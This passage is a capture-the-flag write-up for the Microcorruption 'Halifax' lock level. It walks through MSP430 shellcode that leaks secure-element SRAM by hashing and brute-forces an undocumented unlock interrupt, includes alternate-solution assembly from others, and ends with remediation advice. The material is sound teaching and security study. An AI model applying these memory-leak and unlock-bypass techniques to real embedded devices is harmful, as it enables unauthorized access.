45b6:  <mark>0d12           push	r13</mark>

<p>The key is relatively large to be passed directly on the stack, so it is reasonable to assume that the secure element takes a pointer.

If <code>sha256_internal</code> passes the start offset and length in <code>SP-0x4</code><label for="sn-10" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-10" class="sidenote-toggle" />

before the call to <code>INT</code>, neither word could store a pointer to the key.</p>

<p>This stack layout implies that <code>SP-0x6</code> might be a pointer to the location to write the checksum afterward <em>and</em> a pointer to the key. If this is the case, the checksum will overwrite the key after the interrupt call, and the implementation will pass a null key by default.</p>

<p>This potential side effect (among others) will require the payload to have a custom clean-up routine between interrupt calls.</p>

<p>Alternately, one of the other unused stack words below <code>SP-0x6</code> might be a pointer to the key.</p>

<p>This eventuality is unlikely in practice because <code>SP+0x8</code> contains the return address for <code>sha256_internal</code>. If this word is a pointer to the key, that implies that <code>sha256_internal</code> is deliberately ignoring the correct calling convention and passing a chunk of instruction memory as a key. It is also unlikely that the three words after that are used as pointers because they overlap the checksum return buffer (which happens to be just afterward on the stack).</p>

</code></pre>

<p>While it would be bizarre, this kind of breakage is not out of the question.</p>

<h3>Search Space</h3>
<p>The key is at an unknown offset, and the contents of SRAM vary in length between runs. There are 48 or 304 possible offsets where the key could start, depending on the size of the nonzero data in SRAM for the current run.</p>

<pre><code>&gt;&gt;&gt; 0x40-16
48
&gt;&gt;&gt; 0x140-16
304
</code></pre>

<p>It is unclear whether the contents of SRAM are byte or word addressed, which means that the key could parse as sixteen bytes or eight little-endian words that are two bytes wide. This possibility requires reversing the endianness for every two-byte word in the leaked data.</p>

<pre><code>&gt;&gt;&gt; (0x40-16)*2
96
&gt;&gt;&gt; (0x140-16)*2
608
</code></pre>

<p>Accounting for both the endianness and the exact offset being unknown, there are 608 possible keys on the high end.</p>

<h3>Approach To Automation</h3>
<p>Emulators/debuggers exist for this system that might allow for easier integration with higher-level tooling (i.e., Python), but none of these support the new undocumented interrupts (including <code>0x40</code> and <code>0x41</code>).</p>

<p>There are two options:</p>
<ol>
	<li>Patch instructions into memory, wrap the provided debugger with a higher-level language or framework, expose an API, and write custom code to make calls to it.</li>
	<li>Write all the code in assembly and load it into memory as a debug payload.</li>
	</ol>

	<p>The provided debugger has a bug where it will freeze when single-stepped too quickly, so the latter approach is preferable. The former option also runs slower and will still require some artisan assembly.</p>

	<h3>Key Endianness</h3>
	<p>The first task is modifying the rainbow table Python script to produce a second output that swaps the endianness for every word. Appending extra logic to the end of the existing code accomplishes this.</p>

	<pre><code><xmp>output_little_endian = b''
for i in range(0, len(output), 2):
    output_little_endian += (output[i+1]).to_bytes(1, "big")
    output_little_endian += (output[i]).to_bytes(1, "big")

with open("output_little_endian.bin", "wb") as f:
    f.write(output)

print(binascii.hexlify(output_little_endian).decode())
</xmp></code></pre>

<h2>Second Stage Payload</h2>
<h3>Data Section Tweaks</h3>
<p>Changes to the data section are as follows.</p>
<pre><code>3040 0080 ffff <mark>0003</mark>
<mark>ffaf 00b5</mark> 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
</code></pre>

<p>Given that differential analysis of SRAM dumps indicates that there are usually no more than 0x140 bytes of nonzero data, the upper bound of memory to leak has been lowered from 0x1000 to 0x300.</p>


<pre><code>3040 0080 ffff <mark>0003</mark>
ffaf 00b5 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
0000 0000 0000 0000
</code></pre>

<h3>Extending The Shellcode</h3>

<p>There must be a mechanism to read the contents of SRAM into MCU memory after the external rainbow table lookups are complete.</p>

<p>It is unclear which stack offset should contain the pointer to the key, but it obviously cannot replace the offset or length because that would break the hashing logic. Valid dummy values (0x2) serve as surrogates for these two words. The four words after that contain the pointer to the current offset in the shadow buffer. The call should succeed if interrupt <code>0x41</code> interprets one of these words on the stack as a key pointer.</p>

<p>There must be some mechanism to verify whether the secure element accepted the key and unblocked the unlock interrupt, so it is tested by attempting to call the latter.</p>

<p>The successful unlock status message should appear if the current key candidate authenticates to the secure element.</p>

<p>Lastly, if the unlock interrupt call does not succeed, the last defined word in the data section is compared to the current offset in the shadow buffer.

The code deliberately jumps into null memory and crashes if it is equal, signaling that execution has ended without finding a valid key.

<p>The SRAM data in the shadow buffer usually ranges from <code>0xB000</code> to <code>0xB140</code>, but this is not guaranteed. The payload code assumes the maximum length of SRAM data is 0x500. Execution branches back to the section that refreshes the shadow buffer if the address of the current offset is less than <code>0xB500</code> (0xB000 + 0x500).</p>

      <h3>Results and Analysis</h3>
      <p>Running this payload with either big or little endian SRAM data results in the following output:</p>
      <pre><code><xmp>insn address unaligned
CPUOFF flag set; program no longer running. CPU must now be reset.
</xmp></code></pre>

<p>This message indicates that payload execution completes without any key candidate unblocking the unlock interrupt. There are a few explanations for this:</p>
<ol>
	<li>Stripping an additional layer of encoding from the SRAM data is necessary.</li>

	<ul>
		<li>Unlikely. It might be reasonable to assume the presence of encoding<label for="sn-13" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-13" class="sidenote-toggle" />
<span class="sidenote">
Many non-whitespace characters and multiple equal signs might indicate base64, for example.
</span>

if the extracted data had a consistent format, but the hexdump of the data does not seem to have any discernible pattern.</li>
	</ul>
	<li>The calling convention requires the key to be passed directly on the stack rather than as a pointer.</li>
	<ul>
		<li>Slightly more plausible, but (given that this system uses a 16-bit processor) a value that is eight words wide would be relatively large to be passed directly on the stack. Passing the literal value would make more sense with a small key value (i.e., 1 or 2 words). The payload code required to test this is more complicated to implement, so this possibility is discounted for now.</li>
	</ul>
	<li>The interrupt number is simply wrong.</li>
	<ul>
		<li>This scenario is absurd but possible.</li>
	</ul>
</ol>

<h2>Here Be Dragons</h2>

<p>The third option is worthy of consideration in the absence of saner alternatives. The correct interrupt number may not be <code>0x41</code>.</p>


<h3>Strange Behavior</h3>
<p>This theory is not as far-fetched as it might at first appear. Recall the calling convention for the <code>0x41</code> interrupt call. There are only a few stack locations to pass a key pointer.</p>

<p>It is implausible that the implementation would reference a pointer outside the current stack frame, which rules out the first three words of the checksum return buffer. While not impossible, this implementation choice would be so outlandish as to be outright broken.</p>

<p>The only remaining option is the pointer to the checksum return buffer at <code>SP+0x6</code>, which could theoretically double as the pointer to the key. Recall that the interrupt call dereferences this pointer and overwrites the buffer with the SRAM hash.</p>

</code></pre>

<p>Combining two disparate pieces of functionality (hashing SRAM and passing the key) into a single interrupt call is odd. The returned SRAM hash would clobber the key. The side effect is, for lack of a better word, inelegant. It would be cleaner to separate these two pieces of functionality into different interrupt calls.</p>

<h2>Psychological Warfare</h2>

<p>Recall the description from the "manual" command:</p>

<blockquote>
	Any payload is allowed, because the unlock key must be passed to the new interrupt with code <mark>0x41</mark>, and this key is only stored in secure memory.
</blockquote>

<p>The I/O console prints the following output on each run:</p>

<pre><code>0x7f interrupt disabled, key stored in internal SRAM
unlock by providing the 16 byte key to <mark>0x41</mark> interrupt
</code></pre>

<p>A developer making the same typo in two places is improbable, which implies that if the interrupt number is inaccurate, it is most likely deliberate and meant to hinder reverse engineering efforts. The information conveyed in the manual and status messages may be an instance of psychological warfare.</p>

<h3>Interrupt Number Groupings</h3>

<p>Extending the shellcode to automatically bruteforce the interrupt number is possible, but it is quicker to increment it by hand after narrowing the probable range. The <a href="https://microcorruption.com/public/manual.pdf">manual PDF</a> does not document the new interrupts, but the old ones seem to be grouped by the leading nibble of the interrupt number.</p>

      </table>

      <p>This scheme suggests that all interrupts used for interfacing with the secure element fall into the <code>0x40-0x4F</code> range.</p>

<h3>Payload Modifications</h3>
<h4>Attempt 1</h4>
<p>Regardless of how likely this scenario is, testing the hypothesis requires minimal changes to the payload.</p>

<p>The likely place to start is with the other known interrupt in the <code>0x40-0x4F</code> range: <code>0x40</code>. The firmware pushes two placeholder null words before the interrupt number. Either one of these might be a pointer to the key.</p>


      <pre><code>444a:  mov	#0x4658 "Enabling hardened mode", r15
444e:  call	#0x4586 &lt;puts&gt;
4452:  push	<mark>#0x0</mark>
4454:  push	<mark>#0x0</mark>
4456:  push	#0x40
445a:  call	#0x4550 &lt;INT&gt;
</code></pre>

<p>The section of the payload to be modified is as follows.</p>

<h5>Original payload:</h5>
<pre><code>0d12           push	r13
0d12           push	r13
0d12           push	r13
0d12           push	r13
<mark>2312           push	#0x2
2312           push	#0x2
3012 4100      push	#0x41</mark>
b012 5045      call	#0x4550
3150 0e00      add	#0xe, sp
</code></pre>

<p>The interrupt number should be decremented by one. The dummy values (0x2) can be replaced with the value of <code>R13</code>, as it is now unnecessary to adhere to the calling convention for the <code>0x41</code> interrupt.</p>

<h5>Modified payload:</h5>
<pre><code>0d12           push	r13
0d12           push	r13
0d12           push	r13
0d12           push	r13
<mark>0d12           push	r13
0d12           push	r13
3012 4000      push	#0x40</mark>
b012 5045      call	#0x4550
3150 0e00      add	#0xe, sp
</code></pre>

<p>Assembling and running the modified payload results in the following output at the debug console:</p>

      <pre><code><xmp>insn address unaligned
CPUOFF flag set; program no longer running. CPU must now be reset.
</xmp></code></pre>

<p>This crash indicates that the loop ended without sending a valid key to the correct interrupt.</p>

<h4>Attempt 2</h4>
<p>The known interrupts have been exhausted. As observed previously, interrupts tend to be grouped by function. The next logical step is to try the entire 0x40-0x4F range—starting with <code>0x42</code>.</p>

<h5>Modified payload:</h5>
<pre><code>0d12           push	r13
0d12           push	r13
0d12           push	r13
0d12           push	r13
0d12           push	r13
0d12           push	r13
3012 4000      push	<mark>#0x42</mark>
b012 5045      call	#0x4550
3150 0e00      add	#0xe, sp
</code></pre>

<h2>Authentication Bypass</h2>

<p>Running the above payload and submitting the leaked SRAM data in big-endian format causes the unlock interrupt to trigger successfully.</p>

<pre></code>Door Unlocked

<h2>Conclusion</h2>
<h3>Bug Reporting</h3>

<p>After completing this challenge, it was worth reaching out to the creators and inquiring (as part of a report about multiple unrelated<label for="sn-14" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-14" class="sidenote-toggle" />

issues) whether the erroneous interrupt number in the manual and status messages was a deliberate attempt at psychological warfare.</p>

<blockquote>
The nature of the typo makes a subtle psychological difference: one reference might be mistaken, but multiple sources saying the same thing isn't an accident. [...] If the goal is to make it look like a mistake, only reference it in one place or not at all.

<h3>Competitive Sabotage</h3>
<p>The same email included advice not to fix the typo if it was one.</p>

<blockquote>
If I had to suffer then everyone else should too :)
<br><cite>— Email to challenge creators, November 1st, 2022</cite>
</blockquote>

<p>Antics aside, there was an actual reason for this.</p>

<blockquote>
I liked the black box analysis angle. [...] [M]ake people infer that something in the 0x40-0x4f range must be the undocumented interrupt based on comparing it to the other known interrupt values. [...]

I think it reinforces a useful philosophical mindset: don't trust the device developers too much, because if they knew what they were doing then the device wouldn't have vulnerabilities to begin with. Quite a few of the original 19 levels lied in the level manual or in the program output (about max password lengths or how the HSM-2 worked, for example). I think a deliberate typo or lie about actual interrupt numbers is a nice progression.

<h3>Alternate Approaches</h3>

<p>There are two alternate solutions written several months after the one described herein. These exploits bear review, as both differ substantially from the one presented here (albeit for very different reasons).</p>

<h4>Writeup by John Breaux</h4>

<p><a href="https://www.linkedin.com/in/john-alan-breaux">John Breaux</a> published a <a href="https://www.linkedin.com/posts/john-alan-breaux_micro-corruption-halifax-activity-7082150804056391680-sCKB">writeup</a> several months ago documenting a similar solution.</p>

<h5>Alternate Leak Code</h5>
<p>The main point of difference in this case was the decision to leak only the first few bytes of each hash.</p> 

<blockquote>
	There should be a way to uniquely identify a single byte using the first <code>n</code> bytes of output. We can find <code>n</code> by computing the hashes of the numbers 00-ff, and counting how many unique sequences there are when truncating those hashes to a certain length. [...] The start of my payload, which defines some constants, then saves 3 bytes of the hash of each byte in the internal SRAM, for later printing.
<cite>— John Breaux</cite>
</blockquote>

<p>This trick makes it possible to represent the underlying SRAM data in fewer bytes, resulting in more compact information leak output. The following code accomplishes this.</p>

<pre><code><xmp>get_sram_hashes:
clr   r11            ; loop variable in r11
mov   #msize, r14    ; r14 = 1
mov   #haddr, r13    ; set destination to 0x8000
sr_loop:
mov   r11, r15       ; mov addr r15
call  sha256_internal; <sha256_internal>
add   #hsize, r13    ; keep 3 bytes of the output
inc   r11            ; inc r11
cmp   #sr_len, r11        ; do that 0x1000 times
jnc   sr_loop

print_hex:
clr   r11;
ph_loop:
mov.b haddr(r11), r14
mov.b r14, r15
rra   r15            ; using rra here instead of rra.b means the value won't roll into the highest bit
rra   r15            ; which negates the need to and 0xf, r15
rra   r15
rra   r15
clrc
and   #0xf, r14
mov.b HEX_LUT(r15), r15
call  putchar        ; <putchar>
mov.b HEX_LUT(r14), r15
call  putchar        ; <putchar>
inc   r11            ; inc r11
cmp   #ha_len, r11        ; do that sram_length*3 times
jnc   ph_loop

mov.b #0xa, r15      ; '\n'
call  #0x4578        ; putchar ('\n')
</xmp></code></pre>

<p>It is probably simpler to reuse the existing code in <code>main</code> for printing leaked hashes, but this approach is relatively novel and faster in terms of execution speed.</p>


<h5>Inferior Automation</h5>

<p>The partial hash leakage approach ultimately became a liability, as it complicated the implementation and made it harder to spot subtle bugs.</p>

<blockquote>
I discovered a string formatting error in my python script that caused it to print /[0-9]/ when it meant /0[0-9]/
<cite>— John Breaux</cite>
</blockquote>

<p>This error corrupted input for the SRAM rainbow table lookup process and prevented Breaux from identifying interrupt <code>0x42</code> as the correct one (even though the payload code otherwise should have). The failure was a byproduct of the choice to leak only the first three bytes of each hash, as such a scheme required more convoluted Python code to massage the output back into the correct representation of the source data.</p>

<blockquote>
We exhausted our supply of ideas, and eventually concluded that the challenge must be broken. [...] Over the course of the next 6 months, the three of us worked collaboratively to figure out what went wrong. 
<br><cite>— John Breaux</cite>
</blockquote>


<h5>Not-So-Psychological-Warfare</h5>

<p>Ultimately, someone else informed Breaux that the interrupt number was wrong.</p>

<blockquote>
Nothing was working, and it didn't seem to even attempt to use our keys. So, we contacted the challenge authors. No response. [...] But, eventually, a member of the ReSwitched Discord who happens to have access to the project informed us that there was a typo in both the directions and the program itself.
<cite>— John Breaux</cite>
</blockquote>

<p>This information seemingly<label for="sn-15" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-15" class="sidenote-toggle" />
<span class="sidenote">
If any of the challenge authors are reading this page, confirmation would be appreciated.
</span>

confirms that the erroneous interrupt number was a simple typographic issue rather than a deliberately malicious red herring.</p>

<p>Aside from the custom leak code, Breaux's approach is more or less identical to the one described herein. While it eventually succeeded, it seems to have been a time-consuming process that required aid from at least three other people.</p>


<h5>Timing Analysis</h5>
<blockquote>
It doesn't [...] take more than one cycle to execute. [...] Most other interrupts, if I remember right, cost something to run—are implemented somewhere within the MSP430 emulator's firmware. Yet this one isn't. It's just bizarre.
<br><cite>— John Breaux</cite>
</blockquote>


<p>While not directly relevant to the solution, Breaux uses an unorthodox technique to narrow down candidate interrupt numbers. There is a built-in debugger command that prints the current cycle count. Most interrupt calls take a few cycles to execute. By this logic, any interrupt number that takes multiple cycles must be doing something on the backend. Unfortunately, interrupt <code>0x42</code> seems to break this assumption.</p>


<h4>Read Address Overflow Technique — Developed by Anonymous Author</h4>
<p>The second alternate approach developed several months after the one described herein does not have a public writeup—but it utilizes a creative technique to identify the correct interrupt number.</p>

<h5>Interrupt Side Effects</h5>
<blockquote>
When I was poking around with alternate interrupt numbers, I did check if interrupt 0x42 did anything... But it didn't seem to. There are no side effects to calling INT 0x42.
<br><cite>— John Breaux</cite>
</blockquote>

<p>While a reasonable conclusion, this is not strictly true. A side effect in interrupt <code>0x42</code> is introducible via specifically chosen values passed on the stack.</p>

<p>After ruling out interrupt <code>0x41</code>, testing subsequent interrupt numbers uses the following stack layout.</p>


<pre><code class='language-ascii-noshadows'>      ┌────────────────────────────────────────┐

</code></pre>

<p>The methodology applied herein cannot determine whether an interrupt call does anything, so it attempts to anticipate every possible combination and brute force them until the unlock is triggered. This strategy works well if the payload code is meticulous, but it would be preferable to determine whether any given call is dereferencing the key pointer.</p>

<p>It is possible to detect this on other architectures by providing a pointer to unmapped memory (e.g., a null pointer), that will cause a segmentation fault when dereferenced. Inconveniently, the entire memory space is writable by default on this ISA—dereferencing a null pointer will not cause a crash. A different (anonymous) individual found a way to overcome this limitation.</p>

</code></pre>

<p>Any attempt to interpret these dummy values as pointers will fail with the following error.</p>

<pre><code>read address would wrap
CPUOFF flag set; program no longer running. CPU must now be reset.
</code></pre>

<p>This error occurs because attempting to read a word or multiple bytes starting from that address would cause an integer overflow and a wraparound to address 0x0000, which crashes the processor.</p>

<p>Out of all interrupts in the <code>0x40-0x4F</code> range, this only occurs when calling interrupt <code>0x42</code>. This pattern suggests that only interrupt <code>0x42</code> dereferences one of the pointers. The creator of this technique used it to narrow down which interrupts were attempting to read from MCU memory, which allowed for messier payload code—without concern for subtle breakage.</p>

<p>This technique acts as a sanity check. Aside from that, the rest of the exploit is more or less identical.</p>

<h4>Takeaways</h4>
<blockquote>
<b>Anonymous Author:</b> I am in hell.
<br>
<b>Yours Truly:</b> Halifax is in Canada. Technically speaking, it is the exact meteorological opposite of hell.
</blockquote>

<p>The exploit by John Breaux is a case study of how tricky it can be to attack an implementation like this. The black box analysis process is fraught with subtle perils, and debugging is often maddening. The read address overflow technique is a beautiful example of how to shine more light into the inscrutable abyss.</p>

<p>The exploit described herein relies heavily on robust automation—with as few moving parts as possible—to counteract subtle mistakes. It achieves through conscientiousness what the read address overflow technique achieves through creativity.</p>

<h2>Remediation</h2>
<p>At a conceptual level, the physical design of this system is an improvement over something like <a href="https://microcorruption.com/debugger/Whitehorse">Whitehorse</a>. Adding the logical <code>AND</code> transistor creates a layer of defense in depth enforced at a physics level. Bypassing this protection requires compromising two different chips. That said, there are two failures in this implementation.</p>

<h5>1. Do not execute arbitrary user-supplied payloads on the main MCU.</h5>

<p>A glaring issue remains unexamined: nothing about this architecture requires it to allow arbitrary unsigned code execution on the main MCU. Debug payloads should be signed (as on <a href="./st-johns.html">St. John's</a> or <a href="cold-lake.html">Cold Lake</a>) or eliminated from the implementation altogether.</p>

<p>This mitigation requires attackers to bypass the signature verification mechanism or find another issue that allows them to gain a foothold on the main MCU, adding another layer of defense-in-depth.</p>


<h5>2. Do not implicitly trust third-party vendors to write secure code.</h5>

<p>The graver vulnerability lies in the (ostensibly third-party) secure element. There is no easy way to audit the backing software implementation. Patching would be the vendor's responsibility, and there may be no firmware update mechanism.</p>

<p>In the best-case scenario, this requires waiting for the third-party vendor to ship out patches. In a worst-case scenario, it is unpatchable, and fixing the vulnerability requires releasing a new generation of hardware.<label for="sn-16" class="sidenote-toggle sidenote-number"></label>

<h3>The Problem With Hardware Security</h3>
<h5>The Semantics Of Security Through Obscurity</h5>

<p>Secure elements are designed, in part, to protect against hardware attacks. The problem in the hardware security world is that manufacturers tend to conflate two kinds of security through obscurity. There is a credible argument that undocumented hardware countermeasures demonstrably impede attackers. In this sense, the system relies on hardware-level security through obscurity. Disclosing the hardware-level workings<label for="sn-17" class="sidenote-toggle sidenote-number"></label>

of the chip would put that protection in jeopardy.<label for="sn-18" class="sidenote-toggle sidenote-number"></label>

<span class="sidenote">
This "protection" is a byproduct of the relatively nascent general state of the hardware security field. Falling equipment prices and more accessible education about the subject area will eventually undermine it.
</span>
</p>

<p>That said, the fact that this logic only applies to physical hardware-level security (not firmware or software security) cannot be understated. Just because code runs on a processor secured against hardware attacks does not magically make that code secure against software exploits. Regardless of the platform, software security through obscurity is not an effective countermeasure.</p>

<p>The assumption seems to be that <em>hardware-level</em> security implies software-level security. This belief may stem from the assumption that attackers must extract firmware via a hardware attack and that black box firmware analysis is infeasibly expensive. As the exploit described herein demonstrates, this is not always the case.</p>

<p>Secure processor code is like any other code. Performing source code vulnerability analysis and penetration testing is essential. Blind trust in these devices is foolish—especially for security-critical applications.</p>

<h5>Patching</h5>

<p>Unpatchable black box hardware is depressingly frequent among chips of this variety. It is critically important to determine (before hardware architecture finalization) whether firmware updates are possible for this component and, if so, whether the vendor has responded appropriately to security issues in the past. Any "secure processor" that cannot pass muster necessitates its replacement with one that can.</p>
